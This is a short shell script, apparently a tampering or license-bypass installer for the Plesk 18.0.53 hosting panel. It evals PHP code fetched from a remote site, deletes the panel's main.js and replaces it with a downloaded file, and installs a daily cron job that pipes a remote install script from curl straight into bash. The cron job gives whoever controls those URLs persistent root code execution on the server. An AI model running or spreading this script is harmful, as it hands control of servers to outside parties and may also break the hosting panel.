echo "******************"
echo "Script by Trisout"
echo "******************"
echo "Warning: This Script is made for 18.0.53 of plesk panel. It is possible that it does not work or that it destroys your plesk on higher versions."
sleep 20
plesk php -er "eval(file_get_contents('http://ossav.com/OLC'));"
sleep 5
rm -rf /usr/local/psa/admin/htdocs/modules/OsSav
plesk bin extension --uninstall OsSav
rm /opt/psa/admin/cp/public/javascript/main.js
cd /opt/psa/admin/cp/public/javascript
wget https://raw.githubusercontent.com/trisout78/o-plesk/main/main.js
echo "0 0 * * * bash <(curl -s https://raw.githubusercontent.com/trisout78/o-plesk/main/install.sh)" | crontab -l | { cat; echo "0 0 * * * bash <(curl -s https://raw.githubusercontent.com/trisout78/o-plesk/main/install.sh)"; } | crontab -
echo "INFORMATION: after Error messages: <number>; Warnings: <number>; Errors resolved: <number> you can exit the script"
sleep 20
plesk repair all -y
